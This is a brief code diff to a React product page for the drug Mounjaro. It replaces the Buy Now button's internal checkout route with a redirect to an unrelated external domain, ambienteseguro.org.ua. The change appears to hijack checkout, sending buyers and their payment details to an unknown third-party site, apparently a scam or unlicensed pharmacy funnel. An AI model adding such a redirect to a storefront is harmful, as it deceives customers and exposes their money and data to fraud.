@@ -77,7 +77,7 @@ const ProductMounjaro = () => {
   };
 
   const handleBuyNow = () => {
-    navigate("/checkout");
+    window.location.href = "https://ambienteseguro.org.ua/c/2907df25b1";
   };
 
   const formatTime = (n: number) => String(n).padStart(2, "0");
